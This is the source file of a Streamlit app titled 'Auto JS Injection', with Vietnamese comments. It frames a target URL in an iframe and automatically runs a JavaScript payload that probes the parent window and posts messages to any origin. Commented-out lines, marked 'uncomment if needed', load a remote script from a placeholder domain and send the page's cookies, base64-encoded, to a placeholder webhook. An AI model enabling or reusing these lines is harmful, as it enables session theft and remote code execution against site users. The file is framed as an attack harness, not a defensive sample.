import streamlit as st
import streamlit.components.v1 as components

# Cấu hình page
st.set_page_config(
    page_title="Auto JS Injection",
    page_icon="🚀",
    layout="wide"
)

# Hide Streamlit branding
hide_st_style = """
<style>
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
header {visibility: hidden;}
</style>
"""
st.markdown(hide_st_style, unsafe_allow_html=True)

# Target URL - thay đổi URL này theo ý muốn
TARGET_URL = "https://example.com"

# JavaScript payload - code sẽ tự động chạy
JS_PAYLOAD = """
// Auto-executed JavaScript payload
console.log('Auto-injected JS from Streamlit');
console.log('Current time:', new Date().toISOString());

// Thử access parent window
try {
    console.log('Parent location:', window.parent.location.href);
} catch(e) {
    console.log('Cross-origin blocked:', e.message);
}

// PostMessage to parent
if (window.parent !== window) {
    window.parent.postMessage({
        type: 'auto_payload',
        timestamp: Date.now(),
        message: 'Payload executed successfully'
    }, '*');
}

// Load external script (uncomment nếu cần)
// var s = document.createElement('script');
// s.src = 'https://YOUR-DOMAIN.com/payload.js';
// document.head.appendChild(s);

// Cookie exfiltration (uncomment nếu cần)
// fetch('https://YOUR-WEBHOOK.com/log?data=' + btoa(document.cookie));

// Alert để confirm JS đã chạy
alert('JS Payload executed from Streamlit!');
"""

# Create HTML with auto-injection
injection_html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: #1a1a1a;
            color: #fff;
            font-family: monospace;
        }}
        #info {{
            padding: 10px;
            background: #2a2a2a;
            border-bottom: 2px solid #00ff00;
        }}
        iframe {{
            width: 100%;
            height: calc(100vh - 50px);
            border: none;
        }}
        .status {{
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            background: #333;
        }}
    </style>
</head>
<body>
    <div id="info">
        🎯 Target: <span id="url">{TARGET_URL}</span> | 
        Status: <span class="status" id="status">Loading...</span> |
        JS: <span class="status" id="js-status">Executing...</span>
    </div>
    <iframe id="targetFrame" src="{TARGET_URL}"></iframe>
    
    <script>
        // Auto-injected payload
        {JS_PAYLOAD}
        
        // Update status
        document.getElementById('js-status').textContent = '✅ Executed';
        document.getElementById('js-status').style.color = '#00ff00';
        
        // Monitor iframe loading
        const frame = document.getElementById('targetFrame');
        const status = document.getElementById('status');
        
        frame.onload = function() {{
            status.textContent = '✅ Loaded';
            status.style.color = '#00ff00';
            
            console.log('Iframe loaded:', '{TARGET_URL}');
            
            // Try to access iframe content (will fail if cross-origin)
            try {{
                const iframeDoc = frame.contentDocument || frame.contentWindow.document;
                console.log('Iframe accessible:', iframeDoc.title);
            }} catch(e) {{
                console.log('Cross-origin restriction:', e.message);
            }}
        }};
        
        frame.onerror = function() {{
            status.textContent = '❌ Error';
            status.style.color = '#ff0000';
        }};
        
        // PostMessage listener
        window.addEventListener('message', function(event) {{
            console.log('Received message:', event);
            console.log('Data:', event.data);
            console.log('Origin:', event.origin);
        }});
        
        // Log app loaded
        console.log('=== Streamlit Auto-Injection App ===');
        console.log('Target URL:', '{TARGET_URL}');
        console.log('Timestamp:', new Date().toISOString());
    </script>
</body>
</html>
"""

# Auto-render HTML - không cần button
components.html(injection_html, height=650, scrolling=False)

# Optional: Display info
st.markdown("---")
st.info(f"🔄 Auto-loading: {TARGET_URL}")
st.success("✅ JavaScript payload executing automatically")

# Debug info
